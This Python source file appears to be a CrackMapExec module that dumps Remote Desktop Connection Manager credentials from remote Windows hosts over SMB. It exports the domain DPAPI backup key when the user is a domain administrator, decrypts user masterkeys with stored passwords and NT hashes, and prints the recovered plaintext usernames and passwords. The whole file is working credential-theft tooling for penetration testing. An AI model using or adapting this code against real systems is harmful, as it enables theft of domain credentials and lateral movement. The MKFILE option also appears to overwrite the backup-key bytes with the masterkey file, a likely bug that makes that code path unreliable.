#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from dploot.triage.rdg import RDGTriage
from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
from dploot.triage.backupkey import BackupkeyTriage
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection

from cme.helpers.logger import highlight


class CMEModule:
    name = "rdcman"
    description = "Remotely dump Remote Desktop Connection Manager (sysinternals) credentials"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """
        PVK             Domain backup key file
        MKFILE          File with masterkeys in form of {GUID}:SHA1
        """
        self.pvkbytes = None
        self.masterkeys = None

        if "PVK" in module_options:
            self.pvkbytes = open(module_options["PVK"], "rb").read()

        if "MKFILE" in module_options:
            self.masterkeys = parse_masterkey_file(module_options["MKFILE"])
            self.pvkbytes = open(module_options["MKFILE"], "rb").read()

    def on_admin_login(self, context, connection):
        host = connection.hostname + "." + connection.domain
        domain = connection.domain
        username = connection.username
        kerberos = connection.kerberos
        aesKey = connection.aesKey
        use_kcache = getattr(connection, "use_kcache", False)
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")

        if self.pvkbytes is None:
            try:
                dc = Target.create(
                    domain=domain,
                    username=username,
                    password=password,
                    target=domain,
                    lmhash=lmhash,
                    nthash=nthash,
                    do_kerberos=kerberos,
                    aesKey=aesKey,
                    no_pass=True,
                    use_kcache=use_kcache,
                )

                dc_conn = DPLootSMBConnection(dc)
                dc_conn.connect()

                if dc_conn.is_admin:
                    context.log.success("User is Domain Administrator, exporting domain backupkey...")
                    backupkey_triage = BackupkeyTriage(target=dc, conn=dc_conn)
                    backupkey = backupkey_triage.triage_backupkey()
                    self.pvkbytes = backupkey.backupkey_v2
            except Exception as e:
                context.log.debug("Could not get domain backupkey: {}".format(e))
                pass

        target = Target.create(
            domain=domain,
            username=username,
            password=password,
            target=host,
            lmhash=lmhash,
            nthash=nthash,
            do_kerberos=kerberos,
            aesKey=aesKey,
            no_pass=True,
            use_kcache=use_kcache,
        )

        conn = None

        try:
            conn = DPLootSMBConnection(target)
            conn.smb_session = connection.conn
        except Exception as e:
            context.log.debug("Could not upgrade connection: {}".format(e))
            return

        plaintexts = {username: password for _, _, username, password, _, _ in context.db.get_credentials(cred_type="plaintext")}
        nthashes = {username: nt.split(":")[1] if ":" in nt else nt for _, _, username, nt, _, _ in context.db.get_credentials(cred_type="hash")}
        if password != "":
            plaintexts[username] = password
        if nthash != "":
            nthashes[username] = nthash

        if self.masterkeys is None:
            try:
                masterkeys_triage = MasterkeysTriage(
                    target=target,
                    conn=conn,
                    pvkbytes=self.pvkbytes,
                    passwords=plaintexts,
                    nthashes=nthashes,
                )
                self.masterkeys = masterkeys_triage.triage_masterkeys()
            except Exception as e:
                context.log.debug("Could not get masterkeys: {}".format(e))

        if len(self.masterkeys) == 0:
            context.log.fail("No masterkeys looted")
            return

        context.log.success("Got {} decrypted masterkeys. Looting RDCMan secrets".format(highlight(len(self.masterkeys))))

        try:
            triage = RDGTriage(target=target, conn=conn, masterkeys=self.masterkeys)
            rdcman_files, rdgfiles = triage.triage_rdcman()
            for rdcman_file in rdcman_files:
                if rdcman_file is None:
                    continue
                for rdg_cred in rdcman_file.rdg_creds:
                    if rdg_cred.type == "cred":
                        context.log.highlight(
                            "[%s][%s] %s:%s"
                            % (
                                rdcman_file.winuser,
                                rdg_cred.profile_name,
                                rdg_cred.username,
                                rdg_cred.password.decode("latin-1"),
                            )
                        )
                    elif rdg_cred.type == "logon":
                        context.log.highlight(
                            "[%s][%s] %s:%s"
                            % (
                                rdcman_file.winuser,
                                rdg_cred.profile_name,
                                rdg_cred.username,
                                rdg_cred.password.decode("latin-1"),
                            )
                        )
                    elif rdg_cred.type == "server":
                        context.log.highlight(
                            "[%s][%s] %s - %s:%s"
                            % (
                                rdcman_file.winuser,
                                rdg_cred.profile_name,
                                rdg_cred.server_name,
                                rdg_cred.username,
                                rdg_cred.password.decode("latin-1"),
                            )
                        )
            for rdgfile in rdgfiles:
                if rdgfile is None:
                    continue
                for rdg_cred in rdgfile.rdg_creds:
                    if rdg_cred.type == "cred":
                        context.log.highlight(
                            "[%s][%s] %s:%s"
                            % (
                                rdgfile.winuser,
                                rdg_cred.profile_name,
                                rdg_cred.username,
                                rdg_cred.password.decode("latin-1"),
                            )
                        )
                    elif rdg_cred.type == "logon":
                        context.log.highlight(
                            "[%s][%s] %s:%s"
                            % (
                                rdgfile.winuser,
                                rdg_cred.profile_name,
                                rdg_cred.username,
                                rdg_cred.password.decode("latin-1"),
                            )
                        )
                    elif rdg_cred.type == "server":
                        context.log.highlight(
                            "[%s][%s] %s - %s:%s"
                            % (
                                rdgfile.winuser,
                                rdg_cred.profile_name,
                                rdg_cred.server_name,
                                rdg_cred.username,
                                rdg_cred.password.decode("latin-1"),
                            )
                        )
        except Exception as e:
            context.log.debug("Could not loot RDCMan secrets: {}".format(e))
